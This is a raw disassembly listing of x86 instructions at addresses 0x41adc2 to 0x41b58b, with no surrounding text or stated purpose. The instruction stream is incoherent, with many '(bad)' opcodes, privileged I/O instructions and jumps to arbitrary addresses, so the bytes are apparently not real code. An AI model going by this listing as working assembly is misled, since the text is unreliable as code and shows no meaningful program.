  41adc2:	sub    eax,DWORD PTR [ecx]
  41adc4:	add    BYTE PTR [ebx+eax*1-0x64470000],ch
  41adcb:	outs   dx,DWORD PTR ds:[esi]
  41adcc:	hlt    
  41adcd:	int3   
  41adce:	je     0x41add8
  41add0:	mov    edi,0x19e972be
  41add5:	out    dx,eax
  41add6:	das    
  41add7:	xor    eax,0x9fcf0dd0
  41addc:	jb     0x41adcd
  41adde:	sbb    DWORD PTR [edi+ebp*2-0x66],ebx
  41ade2:	ja     0x41adcc
  41ade4:	jbe    0x41ae50
  41ade6:	inc    ebp
  41ade7:	lds    edx,FWORD PTR [ecx-0x30d10ae8]
  41aded:	cmp    al,0xb9
  41adef:	xor    al,0x4c
  41adf1:	test   eax,0xcc44ae38
  41adf6:	mov    ds:0xde316858,eax
  41adfb:	or     al,0xd2
  41adfd:	mov    esp,0x7ba57999
  41ae02:	loope  0x41ae47
  41ae04:	sub    BYTE PTR [edi-0x19],ah
  41ae07:	push   0x73
  41ae09:	retf   
  41ae0a:	jecxz  0x41ae4a
  41ae0c:	xor    eax,0x1e576b4c
  41ae11:	outs   dx,BYTE PTR ds:[esi]
  41ae12:	sub    al,0x79
  41ae14:	xor    ah,BYTE PTR [edx]
  41ae16:	and    eax,0x7054e28f
  41ae1b:	mov    dl,0xd9
  41ae1d:	popa   
  41ae1e:	(bad)  
  41ae1f:	and    bh,BYTE PTR [eax-0x3d5de1d]
  41ae25:	(bad)  
  41ae26:	int3   
  41ae27:	add    DWORD PTR [eax-0x3a3851c2],edx
  41ae2d:	xor    ch,BYTE PTR [esi-0x302ba3f9]
  41ae33:	scas   al,BYTE PTR es:[edi]
  41ae34:	aad    0x9b
  41ae36:	xor    DWORD PTR [edx-0x1b],esp
  41ae39:	fldenv [edi+0x2ad18323]
  41ae3f:	lds    ecx,FWORD PTR [ecx+0x638f0b49]
  41ae45:	push   edi
  41ae46:	xchg   BYTE PTR [edx+0x25],cl
  41ae49:	jl     0x41ae1f
  41ae4b:	fisubr WORD PTR [eax]
  41ae4d:	mov    gs,WORD PTR [ebx+esi*4-0x1f]
  41ae51:	push   edi
  41ae52:	loopne 0x41ae7c
  41ae54:	ds dec ebp
  41ae56:	dec    edx
  41ae57:	jns    0x41aebc
  41ae59:	mov    BYTE PTR [ebp-0x3d],al
  41ae5c:	dec    ebp
  41ae5d:	std    
  41ae5e:	xor    BYTE PTR [eax+ecx*1-0x10],cl
  41ae62:	lods   eax,DWORD PTR ds:[esi]
  41ae63:	or     eax,0x2196dc42
  41ae68:	push   edx
  41ae69:	pop    edi
  41ae6a:	add    BYTE PTR [ebx-0x72],bl
  41ae6d:	mov    ebp,DWORD PTR [ebp-0x2d36593a]
  41ae73:	jae    0xc8a44a13
  41ae79:	ror    BYTE PTR [edx+0x730828ce],0x3f
  41ae80:	stos   BYTE PTR es:[edi],al
  41ae81:	retf   
  41ae82:	inc    ebp
  41ae83:	cmc    
  41ae84:	xor    eax,0xdb4582a2
  41ae89:	mul    BYTE PTR [edi]
  41ae8b:	and    cl,BYTE PTR [ebx-0x632f4e94]
  41ae91:	enter  0xc1d4,0x93
  41ae95:	test   BYTE PTR [edi],bh
  41ae97:	arpl   WORD PTR [ecx],si
  41ae99:	ret    0x73ae
  41ae9c:	cld    
  41ae9d:	rcr    bh,cl
  41ae9f:	xor    al,0xf3
  41aea1:	sbb    ecx,0xf6bf41bf
  41aea7:	push   es
  41aea8:	inc    eax
  41aea9:	retf   0xeb0c
  41aeac:	xchg   edi,eax
  41aead:	sbb    esi,DWORD PTR [ebp-0x724f794d]
  41aeb3:	(bad)  
  41aeb4:	mov    ds:0x249e6609,al
  41aeb9:	lahf   
  41aeba:	bound  edi,QWORD PTR fs:[edi+0x5bc38020]
  41aec1:	push   0x18f20455
  41aec6:	ss mov ecx,0x8d035cae
  41aecc:	je     0x41aec7
  41aece:	mov    esi,0xaa03a3db
  41aed3:	psubusb mm3,QWORD PTR [ebx]
  41aed6:	inc    edi
  41aed7:	(bad)  
  41aed8:	mov    eax,ds:0x57b4e1dd
  41aedd:	arpl   WORD PTR [ebp+0x5e],si
  41aee0:	test   eax,0xf143e8a4
  41aee5:	and    DWORD PTR [esi+0x33a2cce5],edi
  41aeeb:	into   
  41aeec:	call   0xdd2c:0x1a341247
  41aef3:	out    0xc2,eax
  41aef5:	daa    
  41aef6:	sbb    BYTE PTR [esi],bh
  41aef8:	pop    ecx
  41aef9:	and    eax,0x2c1c5285
  41aefe:	xchg   esp,eax
  41aeff:	std    
  41af00:	popf   
  41af01:	popa   
  41af02:	mov    ebp,0x9e6ff93f
  41af07:	test   cl,dl
  41af09:	dec    eax
  41af0a:	cmc    
  41af0b:	jl     0x41af25
  41af0d:	retf   0x1ea7
  41af10:	jge    0x41af02
  41af12:	xor    BYTE PTR [ecx-0x5f],ch
  41af15:	dec    edi
  41af16:	loop   0x41af62
  41af18:	sub    BYTE PTR [edi],bl
  41af1a:	jg     0x41aebc
  41af1c:	mov    ch,0x7
  41af1e:	dec    ecx
  41af1f:	xchg   esi,eax
  41af20:	sbb    eax,0x96fb2630
  41af25:	fwait
  41af26:	sub    bh,ch
  41af28:	hlt    
  41af29:	mov    al,ds:0xbb04ae0d
  41af2e:	call   0x9d2b3cfd
  41af33:	rcr    DWORD PTR [ecx],1
  41af35:	imul   edx,DWORD PTR [ecx-0x17f963ce],0x1a
  41af3c:	por    mm3,mm1
  41af3f:	mov    ebp,0xd1c27da8
  41af44:	jo     0x41aec6
  41af46:	and    eax,0x89882741
  41af4b:	test   eax,0x76460cec
  41af50:	xchg   DWORD PTR [eax+0x6d],ebx
  41af53:	ss cmp eax,0x2ebbde7b
  41af59:	jne    0x41afa9
  41af5b:	mov    dh,0x9b
  41af5d:	and    cl,bh
  41af5f:	push   esi
  41af60:	jle    0x41afa4
  41af62:	loop   0x41af0b
  41af64:	cli    
  41af65:	shl    BYTE PTR [edi+ebp*4],cl
  41af68:	add    eax,0x2f2471ff
  41af6d:	or     eax,0x1d76ad8e
  41af72:	(bad)  
  41af73:	sti    
  41af74:	push   eax
  41af75:	add    al,BYTE PTR [esi+eiz*8]
  41af78:	(bad)  
  41af79:	sub    al,0x36
  41af7b:	sub    DWORD PTR [ebx+eiz*4],esi
  41af7e:	jne    0x41af03
  41af80:	lock xchg esp,eax
  41af82:	xor    esp,ecx
  41af84:	je     0x41aff4
  41af86:	cmp    ebp,DWORD PTR [edi-0x3d]
  41af89:	loop   0x41af40
  41af8b:	and    al,0xc
  41af8d:	pop    eax
  41af8e:	fistp  DWORD PTR [eax+0x483e0a8a]
  41af94:	lock aad 0xd4
  41af97:	mov    dl,0xb
  41af99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af9a:	inc    BYTE PTR [ecx]
  41af9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af9d:	out    dx,al
  41af9e:	mov    edx,DWORD PTR [edx]
  41afa0:	mov    cl,0x28
  41afa2:	xor    al,0x44
  41afa4:	xchg   DWORD PTR [ebp+0x52],esi
  41afa7:	and    ah,BYTE PTR [edi]
  41afa9:	inc    ecx
  41afaa:	xor    al,0xb0
  41afac:	xor    DWORD PTR ds:0x21a8908a,edx
  41afb2:	scas   eax,DWORD PTR es:[edi]
  41afb3:	cmc    
  41afb4:	push   esi
  41afb5:	or     al,0xa1
  41afb7:	push   DWORD PTR [eax-0x24]
  41afba:	cli    
  41afbb:	xchg   edx,eax
  41afbc:	scas   eax,DWORD PTR es:[edi]
  41afbd:	pop    esi
  41afbe:	(bad)
  41afc1:	out    0xe3,al
  41afc3:	mul    al
  41afc5:	xchg   ebx,eax
  41afc6:	jmp    0x41af65
  41afc8:	mov    BYTE PTR ds:0x78182864,ch
  41afce:	or     al,0x28
  41afd0:	dec    ebx
  41afd1:	test   eax,0xaaac7e8f
  41afd6:	lods   eax,DWORD PTR ds:[esi]
  41afd7:	into   
  41afd8:	popa   
  41afd9:	jmp    0x41afb5
  41afdb:	dec    eax
  41afdc:	mov    WORD PTR [eax],gs
  41afde:	stos   BYTE PTR es:[edi],al
  41afdf:	adc    edi,DWORD PTR ds:0x32f692a4
  41afe5:	scas   eax,DWORD PTR es:[edi]
  41afe6:	xchg   ecx,eax
  41afe7:	mov    edi,DWORD PTR [edi+ecx*8-0x66]
  41afeb:	mov    bh,0xf0
  41afed:	mov    ecx,0xbb5b0585
  41aff2:	add    ecx,DWORD PTR [esi-0x68b34af]
  41aff8:	fcom   QWORD PTR [ecx+0x199e37a6]
  41affe:	or     eax,0x182618bb
  41b003:	gs loopne 0x41aff0
  41b006:	xchg   esi,eax
  41b007:	inc    esp
  41b008:	mov    edi,0x4a713fb1
  41b00d:	and    ebx,DWORD PTR [edx-0x26]
  41b010:	outs   dx,BYTE PTR ds:[esi]
  41b011:	cld    
  41b012:	cmp    al,0x9c
  41b014:	in     eax,dx
  41b015:	jae    0x41afb3
  41b017:	xchg   esi,eax
  41b018:	push   edi
  41b019:	mov    dh,0xf9
  41b01b:	inc    eax
  41b01c:	(bad)  
  41b01d:	jg     0x41b08e
  41b01f:	ins    DWORD PTR es:[edi],dx
  41b020:	popf   
  41b021:	(bad)
  41b024:	inc    ebx
  41b025:	rsqrtps xmm4,xmm0
  41b028:	popa   
  41b029:	dec    ecx
  41b02a:	aam    0x88
  41b02c:	sub    bl,BYTE PTR [ebx+0xc5c8fa1]
  41b032:	push   0x17
  41b034:	leave  
  41b035:	aam    0xfd
  41b037:	aam    0x66
  41b039:	inc    BYTE PTR [ebx+0x3b]
  41b03c:	imul   DWORD PTR [edx-0x36]
  41b03f:	aam    0x89
  41b041:	imul   esp,ebx,0xfffffff0
  41b044:	daa    
  41b045:	mov    ah,0xa3
  41b047:	ror    DWORD PTR [edx+0x39bbc590],0xb6
  41b04e:	out    0xeb,eax
  41b050:	jns    0x41aff6
  41b052:	fldenv [eax-0x5d]
  41b055:	aaa    
  41b056:	xchg   ecx,eax
  41b057:	jmp    0xd91a:0x292c23b1
  41b05e:	jg     0x41b001
  41b060:	(bad)  
  41b061:	sbb    eax,0x43a629f1
  41b066:	pop    edi
  41b067:	ficom  WORD PTR [ecx]
  41b069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b06a:	mov    edi,0x91c628bd
  41b06f:	adc    al,BYTE PTR [ecx+0x5a16a78d]
  41b075:	xchg   DWORD PTR [esi-0x566b729f],eax
  41b07b:	push   eax
  41b07c:	xchg   edi,eax
  41b07d:	cmp    DWORD PTR [ebx+0x71],0xffffffd9
  41b081:	or     bl,BYTE PTR [eax]
  41b083:	mov    ah,0x66
  41b085:	dec    esi
  41b086:	mov    WORD PTR ds:0x27686f41,gs
  41b08c:	retf   0xbb43
  41b08f:	cmc    
  41b090:	or     DWORD PTR [ebx],0xffffffd3
  41b093:	shl    DWORD PTR [ebp+0x47],cl
  41b096:	mov    dh,0x33
  41b098:	sar    BYTE PTR [ebp+0x7f],0xb1
  41b09c:	jge    0x41b036
  41b09e:	repz out dx,al
  41b0a0:	dec    ecx
  41b0a1:	adc    eax,0x1a918208
  41b0a6:	add    eax,0x9653c790
  41b0ab:	scas   eax,DWORD PTR es:[edi]
  41b0ac:	fst    DWORD PTR [ecx+edi*2+0x20310fb9]
  41b0b3:	div    BYTE PTR [eax]
  41b0b5:	sub    al,0xc5
  41b0b7:	inc    esp
  41b0b8:	call   0xaf152aef
  41b0bd:	or     DWORD PTR [ebp-0x67ed8295],ebx
  41b0c3:	add    edi,eax
  41b0c5:	in     al,0xda
  41b0c7:	xchg   ebp,eax
  41b0c8:	xchg   edi,eax
  41b0c9:	xor    BYTE PTR [edx],bl
  41b0cb:	push   edi
  41b0cc:	xor    dl,bh
  41b0ce:	cli    
  41b0cf:	add    BYTE PTR [edi],bh
  41b0d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0d2:	ds in  al,0x4f
  41b0d5:	imul   ebx,DWORD PTR [esi-0x3887ef91],0xc06d079a
  41b0df:	adc    BYTE PTR [ebp+0x489f3704],bl
  41b0e5:	pop    ecx
  41b0e6:	cmc    
  41b0e7:	fild   DWORD PTR [ecx]
  41b0e9:	shl    DWORD PTR [esi-0x26],1
  41b0ec:	les    eax,FWORD PTR [ebx-0x21]
  41b0ef:	and    bl,BYTE PTR [eax+0x54]
  41b0f2:	push   ecx
  41b0f3:	out    dx,eax
  41b0f4:	inc    ecx
  41b0f5:	xor    DWORD PTR [esi],ebp
  41b0f7:	jbe    0x41b12e
  41b0f9:	loop   0x41b178
  41b0fb:	cmp    al,0xe0
  41b0fd:	imul   eax,esi,0xc3ba1b81
  41b103:	sbb    DWORD PTR [ecx-0x7ba148ef],edx
  41b109:	push   esi
  41b10a:	or     DWORD PTR [esp+edx*4-0x2ab4e20d],eax
  41b111:	jmp    0x82ab:0xf212d01c
  41b118:	stc    
  41b119:	jmp    0x41b111
  41b11b:	mov    al,0xc4
  41b11d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b11e:	mov    edx,0xe4b28af8
  41b123:	pushf  
  41b124:	arpl   WORD PTR [edx-0x714a145a],di
  41b12a:	and    al,0x9b
  41b12c:	rcr    DWORD PTR [ebp-0x2a],1
  41b12f:	test   esp,ecx
  41b131:	(bad)
  41b135:	in     al,0x78
  41b137:	mov    eax,0xbd1ac108
  41b13c:	mov    eax,ds:0x1ac9c32
  41b141:	repz jae 0x41b13d
  41b144:	shl    DWORD PTR [edx],1
  41b146:	mov    ecx,0x903f6eb0
  41b14b:	aam    0x7
  41b14d:	or     BYTE PTR [esi],ah
  41b14f:	dec    esp
  41b150:	stc    
  41b151:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b152:	and    BYTE PTR ds:0xdde530d1,al
  41b158:	push   ebx
  41b159:	int3   
  41b15a:	inc    ebp
  41b15b:	dec    ebx
  41b15c:	mov    bh,0xd8
  41b15e:	iret   
  41b15f:	jl     0x41b0ee
  41b161:	pop    ecx
  41b162:	mov    al,0xe8
  41b164:	and    eax,0xd425aacf
  41b169:	mov    WORD PTR es:[ecx],es
  41b16c:	mov    WORD PTR ds:0x1fdf46cc,gs
  41b172:	push   ebx
  41b173:	rol    esp,0x0
	...
  41b17e:	add    BYTE PTR [eax],al
  41b180:	add    bl,ah
  41b182:	call   0xf8dd8217
  41b187:	jecxz  0x41b184
  41b189:	jns    0x41b1d5
  41b18b:	shr    ebp,0x2d
  41b18e:	push   eax
  41b18f:	jne    0x41b203
  41b191:	shr    DWORD PTR [esi],0x1
  41b194:	add    BYTE PTR [ebx+eax*1+0x590a0000],ch
  41b19b:	pop    esi
  41b19c:	xchg   edi,eax
  41b19d:	mov    edi,0xf68703dd
  41b1a2:	mov    cs,WORD PTR [esi+0x764f1d46]
  41b1a8:	pop    es
  41b1a9:	repz jbe 0x41b1cd
  41b1ac:	fmul   DWORD PTR [esi-0x49]
  41b1af:	(bad)
  41b1b2:	and    DWORD PTR [eax],ebx
  41b1b4:	stos   BYTE PTR es:[edi],al
  41b1b5:	push   eax
  41b1b6:	push   ebx
  41b1b7:	cs push edx
  41b1b9:	imul   ecx,edi,0xe591cfb6
  41b1bf:	sub    dh,ch
  41b1c1:	cmp    eax,0x9b00df7d
  41b1c6:	out    0xfc,al
  41b1c8:	sub    eax,0xedb315c3
  41b1cd:	outs   dx,DWORD PTR ds:[esi]
  41b1ce:	mov    DWORD PTR [esi+0x51],esi
  41b1d1:	or     eax,0xcf1eceff
  41b1d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1d7:	jae    0x41b1ae
  41b1d9:	cmp    eax,0xbd7d3d45
  41b1de:	mov    edi,0xfd430869
  41b1e3:	dec    esp
  41b1e4:	stos   DWORD PTR es:[edi],eax
  41b1e5:	inc    esp
  41b1e6:	mov    ebp,0x873a6985
  41b1eb:	out    dx,al
  41b1ec:	xor    BYTE PTR ds:0x18de4e71,ah
  41b1f2:	or     eax,0xf5c43102
  41b1f7:	adc    al,0x3
  41b1f9:	test   BYTE PTR [ebp+0x28fa0bae],bl
  41b1ff:	adc    BYTE PTR [edi+0x5caf60f0],0x8f
  41b206:	or     BYTE PTR [edx+0x5c],0x3f
  41b20a:	ror    DWORD PTR [esi-0x7d787a73],0x6c
  41b211:	xor    esi,ebp
  41b213:	(bad)  
  41b214:	jecxz  0x41b237
  41b216:	jae    0x41b20b
  41b218:	call   0x1f991809
  41b21d:	or     al,0x75
  41b21f:	xlat   BYTE PTR ds:[ebx]
  41b220:	inc    esp
  41b221:	test   al,0x44
  41b223:	ret    0x3ed8
  41b226:	jo     0x41b20f
  41b228:	rol    ecx,0xe7
  41b22b:	jle    0x41b25d
  41b22d:	fdivr  st,st(1)
  41b22f:	cld    
  41b230:	loope  0x41b280
  41b232:	push   0xffffffd7
  41b234:	call   0x6509:0xfd41a1d8
  41b23b:	cmp    eax,0xdc123e3f
  41b240:	jg     0x41b1d6
  41b242:	cmc    
  41b243:	adc    al,0x7d
  41b245:	dec    ebx
  41b246:	cmp    BYTE PTR [edx-0x57],bh
  41b249:	jae    0x41b2b4
  41b24b:	je     0x41b233
  41b24d:	cmp    al,bl
  41b24f:	xor    eax,0x865a970b
  41b254:	pushf  
  41b255:	into   
  41b256:	push   0x177c3e5e
  41b25b:	and    BYTE PTR [edx],0xfc
  41b25e:	in     eax,0x9b
  41b260:	out    0x3,al
  41b262:	xchg   ecx,eax
  41b263:	adc    edi,DWORD PTR [eax+0x7b]
  41b266:	mov    eax,ds:0x7a9bb75a
  41b26b:	das    
  41b26c:	and    eax,0x44655bc
  41b271:	pop    es
  41b272:	pop    edi
  41b273:	(bad)  
  41b275:	add    BYTE PTR [edx+0x5e5d279],al
  41b27b:	sar    DWORD PTR [esi+0x3a91c18f],0xfd
  41b282:	and    al,0xc6
  41b284:	bound  ebx,QWORD PTR [edi+0x1f]
  41b287:	jbe    0x41b259
  41b289:	rol    esi,0xdb
  41b28c:	add    eax,0xf9ee12f7
  41b291:	mov    eax,0xc249f903
  41b296:	dec    eax
  41b297:	not    BYTE PTR [eax+0x4b]
  41b29a:	fwait
  41b29b:	mov    dl,0x1e
  41b29d:	xchg   esp,eax
  41b29e:	and    al,0x12
  41b2a0:	mov    eax,0x70a1ec9d
  41b2a5:	sti    
  41b2a6:	xor    edi,edi
  41b2a8:	mov    eax,ds:0xe7a6165b
  41b2ad:	or     DWORD PTR [edx+0x37b54fb4],esi
  41b2b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2b4:	dec    ecx
  41b2b5:	in     al,0xca
  41b2b7:	loope  0x41b308
  41b2b9:	in     al,dx
  41b2ba:	stos   BYTE PTR es:[edi],al
  41b2bb:	inc    eax
  41b2bc:	pop    ss
  41b2bd:	scas   eax,DWORD PTR es:[edi]
  41b2be:	arpl   WORD PTR [esi-0xe0284d1],sp
  41b2c4:	inc    ecx
  41b2c5:	add    al,0x80
  41b2c7:	or     bh,dl
  41b2c9:	mov    ebx,0x424df9d4
  41b2ce:	stos   BYTE PTR es:[edi],al
  41b2cf:	xor    DWORD PTR [edi-0x60719def],0xffffff82
  41b2d6:	jmp    0xf675f39e
  41b2db:	popa   
  41b2dc:	mov    dh,0xc4
  41b2de:	push   ss
  41b2df:	fsub   st,st(2)
  41b2e1:	push   0x22b30c83
  41b2e6:	icebp  
  41b2e7:	aas    
  41b2e8:	jl     0x41b2fa
  41b2ea:	(bad)  
  41b2eb:	fmul   st,st(7)
  41b2ed:	mov    ebp,0xba45faf2
  41b2f2:	pop    ss
  41b2f3:	repnz pop eax
  41b2f5:	cdq    
  41b2f6:	mov    cs,WORD PTR [edx-0x7]
  41b2f9:	lahf   
  41b2fa:	push   ecx
  41b2fb:	retf   0xe294
  41b2fe:	cmp    bl,bh
  41b300:	clc    
  41b301:	mov    bh,0xc2
  41b303:	shl    DWORD PTR [edx+0x3a],1
  41b306:	jmp    0x41b2c2
  41b308:	jmp    0x5930dcbd
  41b30d:	jecxz  0x41b2a5
  41b30f:	mov    esp,0x5444380f
  41b314:	mov    edi,0x807e1aea
  41b319:	push   ss
  41b31a:	jne    0x41b2c6
  41b31c:	and    BYTE PTR [esi+0x3cdef835],0xa6
  41b323:	jno    0x41b318
  41b325:	pop    esp
  41b326:	sub    BYTE PTR [esi-0x16],ch
  41b329:	retf   0x8555
  41b32c:	jp     0x41b353
  41b32e:	jo     0x41b396
  41b330:	mov    ds:0xcc4ff24,al
  41b335:	loope  0x41b368
  41b337:	in     al,dx
  41b338:	cli    
  41b339:	adc    ecx,DWORD PTR [ecx+0x2f62997d]
  41b33f:	dec    edi
  41b340:	and    cl,BYTE PTR [eax]
  41b342:	pop    edi
  41b343:	cmp    edx,edi
  41b345:	iret   
  41b346:	mov    dh,0xb3
  41b348:	cmp    cl,al
  41b34a:	xchg   BYTE PTR [ebp-0x42],ah
  41b34d:	push   esi
  41b34e:	js     0x41b2fe
  41b350:	cmp    dh,BYTE PTR [esi-0x2006a7df]
  41b356:	popa   
  41b357:	cmp    al,0x7
  41b359:	cwde   
  41b35a:	repnz fs popa 
  41b35d:	xor    esp,DWORD PTR [edi-0x2]
  41b360:	add    al,0xae
  41b362:	xlat   BYTE PTR ds:[ebx]
  41b363:	out    dx,eax
  41b364:	ins    DWORD PTR es:[edi],dx
  41b365:	xchg   ecx,eax
  41b366:	push   esi
  41b367:	arpl   ax,dx
  41b369:	and    al,0x11
  41b36b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b36c:	daa    
  41b36d:	and    al,0x1d
  41b36f:	into   
  41b370:	shl    BYTE PTR [ebx+eax*2-0x45a10eba],1
  41b377:	enter  0xb274,0x5d
  41b37b:	sahf   
  41b37c:	adc    eax,0x20da6c7a
  41b381:	adc    DWORD PTR [eax+0x1f],0x512809c4
  41b388:	dec    edi
  41b389:	test   eax,0xb01be791
  41b38e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b38f:	bound  esi,QWORD PTR [eax+0x183155f9]
  41b395:	sbb    ebx,ebp
  41b397:	or     BYTE PTR [eax-0x44],bl
  41b39a:	aad    0x94
  41b39c:	sbb    BYTE PTR [edx+0x23],al
  41b39f:	hlt    
  41b3a0:	sub    eax,0x2d7c9596
  41b3a5:	xchg   ch,bh
  41b3a7:	(bad)  
  41b3a8:	push   ds
  41b3a9:	popa   
  41b3aa:	xchg   edx,eax
  41b3ab:	fiadd  DWORD PTR [esi+0xeacebfa]
  41b3b1:	sub    bh,bh
  41b3b3:	xchg   BYTE PTR [eax-0x12],bh
  41b3b6:	icebp  
  41b3b7:	data16 cmp al,0xcb
  41b3ba:	mov    al,ds:0xb0e41247
  41b3bf:	inc    eax
  41b3c0:	cmp    BYTE PTR [edi+eiz*4-0x55],0x2e
  41b3c5:	or     ebx,0xffffff98
  41b3c8:	imul   ebp,edx,0x5cc035c4
  41b3ce:	or     esi,DWORD PTR [edx]
  41b3d0:	je     0x41b403
  41b3d2:	push   0x13
  41b3d4:	mov    ds:0x4c987903,eax
  41b3d9:	shr    dl,0x7a
  41b3dc:	jb     0x41b45d
  41b3de:	dec    esp
  41b3df:	loopne 0x41b3ba
  41b3e1:	jmp    0x8ec0f699
  41b3e6:	(bad)  [ebx-0x2bd7f9e]
  41b3ec:	xlat   BYTE PTR ds:[ebx]
  41b3ed:	pop    es
  41b3ee:	adc    BYTE PTR [edx],bh
  41b3f0:	push   ecx
  41b3f1:	add    DWORD PTR [ebp-0x1a],0xcc59cf25
  41b3f8:	sub    DWORD PTR [ebx-0x51e401b0],edi
  41b3fe:	clc    
  41b3ff:	mov    edi,0xedc0f8e1
  41b404:	in     eax,0x21
  41b406:	imul   esi,DWORD PTR [esi-0x23],0x11
  41b40a:	fld    QWORD PTR [ecx+0x43]
  41b40d:	xchg   DWORD PTR ds:0x9ac3fc3c,ebx
  41b413:	jne    0x41b46e
  41b415:	xchg   DWORD PTR [esi-0x7db94caf],edi
  41b41b:	stc    
  41b41c:	les    edi,FWORD PTR [ebx-0x79]
  41b41f:	icebp  
  41b420:	xchg   esi,eax
  41b421:	dec    edi
  41b422:	shl    BYTE PTR [ebx+0x3688365e],1
  41b428:	pop    esp
  41b429:	lods   eax,DWORD PTR ds:[esi]
  41b42a:	in     al,0xf2
  41b42c:	int3   
  41b42d:	sahf   
  41b42e:	das    
  41b42f:	inc    esi
  41b430:	lea    ebx,[edx+ebx*2+0x71]
  41b434:	mov    esp,eax
  41b436:	fisubr DWORD PTR [ebx+ebx*1-0x4070e347]
  41b43d:	mov    edi,0x609470d
  41b442:	imul   edx,DWORD PTR [edx-0x5e],0x17
  41b446:	lahf   
  41b447:	fbstp  TBYTE PTR [ebp+0x4e]
  41b44a:	loopne 0x41b405
  41b44c:	in     eax,0x87
  41b44e:	dec    edx
  41b44f:	je     0x41b3dc
  41b451:	pop    edx
  41b452:	add    ebx,DWORD PTR [ecx+0x5a]
  41b455:	outs   dx,DWORD PTR ds:[esi]
  41b456:	add    eax,0x1f72b755
  41b45b:	push   ebp
  41b45c:	xlat   BYTE PTR ds:[ebx]
  41b45d:	loope  0x41b4ce
  41b45f:	jmp    0x41b44a
  41b461:	adc    al,BYTE PTR [ebx-0x15a8c992]
  41b467:	xchg   edx,eax
  41b468:	xchg   BYTE PTR [ebp-0x17e69784],bl
  41b46e:	inc    edx
  41b46f:	nop
  41b470:	stos   BYTE PTR es:[edi],al
  41b471:	ins    DWORD PTR es:[edi],dx
  41b472:	sbb    ah,dl
  41b474:	repz pop ds
  41b476:	dec    edi
  41b477:	xchg   edx,eax
  41b478:	xor    BYTE PTR ds:0x48614a5d,dl
  41b47e:	dec    ecx
  41b47f:	jp     0x41b4f3
  41b481:	mov    ebp,ecx
  41b483:	and    BYTE PTR ds:0xa622b61b,bh
  41b489:	dec    esi
  41b48b:	mov    DWORD PTR [edx],esi
  41b48d:	inc    ebp
  41b48e:	popa   
  41b48f:	je     0x41b4ef
  41b491:	aam    0x2f
  41b493:	gs call 0xed056696
  41b499:	test   BYTE PTR [edx+0x54],ah
  41b49c:	fs dec edx
  41b49e:	mov    ds:0xd8865066,eax
  41b4a3:	mov    edi,esi
  41b4a5:	adc    eax,0x890d9645
  41b4aa:	mov    al,ds:0x17421eef
  41b4af:	dec    eax
  41b4b0:	mov    al,ds:0x64fec62c
  41b4b5:	add    bh,bh
  41b4b7:	pop    ebx
  41b4b8:	idiv   esp
  41b4ba:	xchg   ebx,ebx
  41b4bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4bd:	mov    ebx,0xd6f13c5e
  41b4c2:	(bad)  
  41b4c3:	ds mov bl,0x39
  41b4c6:	inc    edi
  41b4c7:	test   dl,ah
  41b4c9:	xor    DWORD PTR [edx-0x7f935980],esp
  41b4cf:	sbb    al,BYTE PTR [ebx-0x6b]
  41b4d2:	outs   dx,DWORD PTR ds:[esi]
  41b4d3:	jns    0x41b53c
  41b4d5:	cmp    DWORD PTR [edi-0x7540be9f],eax
  41b4db:	rcr    BYTE PTR [ebx+0x66],cl
  41b4de:	test   al,0xc0
  41b4e0:	icebp  
  41b4e1:	add    eax,0x2b4b0b11
  41b4e6:	sub    DWORD PTR [ecx+0x4a],edx
  41b4e9:	sub    BYTE PTR [eax+0x461e749d],0x8
  41b4f0:	xor    al,0x19
  41b4f2:	and    DWORD PTR [ebx+0x27],0xe6a13cdc
  41b4f9:	sub    bl,bh
  41b4fb:	push   0x64
  41b4fd:	add    bh,BYTE PTR [edi+eax*8]
  41b500:	jp     0x41b532
  41b502:	xor    DWORD PTR [ebp+0x37],edx
  41b505:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b506:	cdq    
  41b507:	fisub  WORD PTR [ecx+ebx*4-0x7b]
  41b50b:	or     esi,edi
  41b50d:	or     bl,cl
  41b50f:	test   al,0x3d
  41b511:	(bad)  
  41b513:	aas    
  41b514:	push   ebp
  41b515:	pop    edi
  41b516:	scas   al,BYTE PTR es:[edi]
  41b517:	(bad)  [ebp-0x4]
  41b51a:	adc    eax,0xbbfae55e
  41b51f:	arpl   WORD PTR [esi-0x4f4fb3c4],bp
  41b525:	sbb    al,0xe0
  41b527:	mov    ebx,0xbe10aaf5
  41b52c:	and    al,0xa4
  41b52e:	and    ecx,DWORD PTR [eax-0x64]
  41b531:	xchg   ebx,eax
  41b532:	and    al,0x21
  41b534:	mov    al,0x62
  41b536:	jno    0x41b576
  41b538:	sub    BYTE PTR [edi],cl
  41b53a:	sbb    eax,0xfb27a7a1
  41b53f:	rcl    cl,cl
  41b541:	out    dx,eax
  41b542:	mov    bl,0x62
  41b544:	or     BYTE PTR [eax],al
	...
  41b54e:	add    BYTE PTR [eax],al
  41b550:	add    dh,ch
  41b552:	data16 hlt 
  41b554:	lods   eax,DWORD PTR ds:[esi]
  41b555:	cld    
  41b556:	mov    edi,0xbcb067ff
  41b55b:	hlt    
  41b55c:	xor    eax,0x7ce8fd69
  41b561:	ins    DWORD PTR es:[edi],dx
  41b562:	xor    al,BYTE PTR [ecx]
  41b564:	add    BYTE PTR [ebx+eax*1-0x67fa0000],ch
  41b56b:	pop    ss
  41b56c:	inc    ebp
  41b56d:	inc    esi
  41b56e:	outs   dx,BYTE PTR ds:[esi]
  41b56f:	in     al,0xfc
  41b571:	ficom  DWORD PTR [ebp-0x4d]
  41b574:	hlt    
  41b575:	add    al,0x89
  41b577:	push   eax
  41b578:	xchg   ebx,eax
  41b579:	(bad)  
  41b57a:	mov    ebx,0xd74c823a
  41b57f:	inc    edx
  41b580:	jmp    DWORD PTR [eax-0x29]
  41b583:	and    eax,0x43c72190
  41b588:	pop    eax
  41b589:	(bad)  
  41b58a:	pushf  
  41b58b:	push   0xffffffd9
